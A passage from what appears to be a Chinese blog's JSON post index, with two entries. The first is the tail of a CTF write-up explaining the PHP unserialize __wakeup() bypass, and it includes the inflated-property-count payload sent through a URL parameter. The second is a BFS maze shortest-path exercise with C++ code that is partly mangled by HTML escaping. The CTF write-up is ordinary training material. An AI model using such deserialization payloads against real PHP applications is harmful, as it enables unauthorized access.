requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;queue&gt;#include &lt;algorithm&gt;using namespace std;int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs()&#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main()&#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;E&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0;&#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]